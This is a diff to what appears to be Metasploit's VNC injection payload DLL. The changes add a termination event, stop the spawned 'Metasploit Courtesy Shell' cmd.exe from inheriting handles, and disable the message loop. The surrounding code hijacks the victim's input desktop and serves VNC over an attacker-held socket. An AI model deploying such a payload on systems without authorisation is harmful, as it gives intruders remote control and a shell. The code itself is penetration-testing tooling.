@@ -61,6 +61,7 @@ HINSTANCE	hAppInstance;
 const char	*szAppName = "vncdll";
 DWORD		mainthreadId;
 CHAR globalPassphrase[MAXPWLEN+1];
+HANDLE VncTerminateEvent = NULL;
 
 BOOL WINAPI DllMain(HINSTANCE hInstance, DWORD blah, LPVOID bleh)
 {
@@ -87,6 +88,9 @@ extern "C" __declspec(dllexport) int Init(SOCKET fd)
 	// vnclog.SetFile("C:\\WinVNC.log", false);
 
 	HWINSTA os = GetProcessWindowStation();
+
+	// Create the termination event
+	VncTerminateEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
 
 	// Get our bearings, hijack the input desktop
 	HWINSTA ws = OpenWindowStation("winsta0", TRUE, MAXIMUM_ALLOWED);
@@ -163,7 +167,7 @@ extern "C" __declspec(dllexport) int Init(SOCKET fd)
 	si.lpTitle = "Metasploit Courtesy Shell (TM)";
 	si.dwFillAttribute = FOREGROUND_RED|FOREGROUND_BLUE|FOREGROUND_GREEN|BACKGROUND_BLUE;
 
-	CreateProcess(NULL, "cmd.exe", 0, 0, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
+	CreateProcess(NULL, "cmd.exe", 0, 0, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
 	CloseHandle(pi.hThread);
 	CloseHandle(pi.hProcess);
 
@@ -221,15 +225,22 @@ extern "C" __declspec(dllexport) int Init(SOCKET fd)
 	server.AddClient(&sock, FALSE, FALSE);
 
 	// Now enter the message handling loop until told to quit!
+	WaitForSingleObjectEx(VncTerminateEvent, INFINITE, FALSE);
+
+#if 0
 	MSG msg;
 	while (GetMessage(&msg, NULL, 0,0) ) {
+		MessageBox(0, "window msg", 0, 0);
 		vnclog.Print(LL_INTINFO, VNCLOG("message %d recieved\n"), msg.message);
 
 		TranslateMessage(&msg);  // convert key ups and downs to chars
 		DispatchMessage(&msg);
 	}
+	
+	return msg.wParam;
+#endif
 
 	vnclog.Print(LL_STATE, VNCLOG("shutting down server\n"));
 
-	return msg.wParam;
-};
+	return 0;
+}
